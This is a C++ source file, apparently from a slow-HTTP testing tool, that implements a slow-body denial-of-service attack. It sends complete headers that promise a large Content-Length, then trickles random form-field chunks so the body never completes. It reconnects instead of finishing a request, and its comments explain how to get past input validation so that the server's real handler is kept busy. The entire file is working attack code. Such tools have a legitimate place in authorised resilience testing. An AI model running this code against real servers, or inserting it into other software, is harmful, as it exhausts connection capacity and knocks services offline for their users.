// SPDX-License-Identifier: Apache-2.0
// Copyright 2011-2026 Sergey Shekyan and contributors
#include "slowhttp/attacks/slow_body.hpp"

#include <cstddef>

namespace slowhttp {
namespace {
// The classic tool opens the body with this, so the request looks like a real
// form submission that simply has not finished arriving.
const char kOpeningBody[] = "foo=bar";
}  // namespace

SlowBody::SlowBody(const Config& cfg)
    : cfg_(cfg),
      // A caller-supplied payload replaces the placeholder entirely: endpoints
      // that validate their input reject "foo=bar" before the hold can bite, so
      // the whole attack lands on a 400 handler instead of the real one.
      opening_body_bytes_(cfg.body_data.empty() ? std::string(kOpeningBody)
                                                : cfg.body_data),
      headers_(build_headers()),
      opening_body_(opening_body_bytes_.size()),
      interval_(std::chrono::duration_cast<Millis>(cfg.interval)),
      rng_(std::random_device{}()),
      body_sent_(static_cast<std::size_t>(cfg.connections), 0) {}

void SlowBody::on_open(ConnId id) {
  if (id >= 0 && static_cast<std::size_t>(id) < body_sent_.size())
    body_sent_[id] = 0;
}

Action SlowBody::on_connect(ConnId id) {
  if (id >= 0 && static_cast<std::size_t>(id) < body_sent_.size())
    body_sent_[id] = opening_body_;
  return Action::send(headers_, interval_);
}

Action SlowBody::on_timer(ConnId id) {
  std::string chunk = followup_chunk();
  if (id >= 0 && static_cast<std::size_t>(id) < body_sent_.size()) {
    const std::size_t limit = static_cast<std::size_t>(cfg_.content_length);
    // Completing the body would hand the server a finished request, which it
    // would answer and close -- ending the hold. Start a fresh connection instead
    // of finishing the one we have.
    if (body_sent_[id] + chunk.size() >= limit) return Action::reconnect();
    body_sent_[id] += chunk.size();
  }
  return Action::send(std::move(chunk), interval_);
}

Action SlowBody::on_readable(ConnId /*id*/, const char* /*data*/,
                             std::size_t /*len*/) {
  // The server answered (or hung up) without waiting for the rest of the body.
  return Action::reconnect();
}

std::string SlowBody::build_headers() const {
  std::string req;
  req.reserve(320);
  req += cfg_.effective_verb();
  req += ' ';
  req += cfg_.request_target();
  req += " HTTP/1.1\r\n";
  req += "Host: " + cfg_.target.host_in_url() + "\r\n";
  req += "User-Agent: " + cfg_.user_agent + "\r\n";
  // The promise the server will wait on: far more body than we intend to send.
  req += "Content-Length: " + std::to_string(cfg_.content_length) + "\r\n";
  req += "Content-Type: " + cfg_.content_type + "\r\n";
  req += "Accept: " + cfg_.accept + "\r\n";
  req += cfg_.caller_headers();
  req += "Connection: close\r\n";
  // Headers end here -- deliberately complete, unlike Slowloris. Only the body
  // that follows is withheld.
  req += "\r\n";
  req += opening_body_bytes_;
  return req;
}

std::string SlowBody::followup_chunk() {
  // "&xx=xx", matching the classic tool's body payload pattern.
  std::string chunk = "&";
  chunk += random_token(cfg_.max_random_data_len);
  chunk += "=";
  chunk += random_token(cfg_.max_random_data_len);
  return chunk;
}

std::string SlowBody::random_token(int max_len) {
  static const char kAlphabet[] =
      "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  int hi = max_len < 2 ? 2 : max_len;
  std::uniform_int_distribution<int> len_dist(1, hi);
  std::uniform_int_distribution<int> ch_dist(0, sizeof(kAlphabet) - 2);
  int n = len_dist(rng_);
  std::string s;
  s.reserve(n);
  for (int i = 0; i < n; ++i) s += kAlphabet[ch_dist(rng_)];
  return s;
}

}  // namespace slowhttp
